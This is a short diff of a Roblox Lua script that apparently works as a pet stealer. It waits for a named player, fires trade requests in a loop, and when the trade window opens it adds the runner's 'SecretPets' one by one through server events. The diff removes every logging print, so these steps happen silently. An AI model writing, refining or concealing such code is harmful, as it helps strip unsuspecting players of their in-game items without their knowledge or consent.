@@ -14,10 +14,8 @@ local TRADE_INTERVAL = 5
 -- Wait for the player to join (if not already in game)
 local targetPlayer = Players:FindFirstChild(waitedPlayer)
 if not targetPlayer then
-	print("Waiting for " .. waitedPlayer .. " to join...")
 	targetPlayer = Players:WaitForChild(waitedPlayer)
 end
-print("Player found: " .. targetPlayer.Name)
 
 -- Trade Request Loop (runs on Heartbeat)
 local lastFireTime = 0
@@ -72,7 +70,6 @@ local function mainCode()
 	for i = 1, totalPets do
 		local petId = SecretPets[i]
 		task.delay(i * 0.5, function()
-			print("Adding to trade:", petId)
 			Event:FireServer("TradeAddPet", petId)
 	
 			if i == totalPets then
@@ -91,7 +88,6 @@ task.spawn(function()
 
 	tradingFrame:GetPropertyChangedSignal("Visible"):Connect(function()
 		if tradingFrame.Visible then
-			print("Trading UI opened, running mainCode()")
 			mainCode()
 		end
 	end)
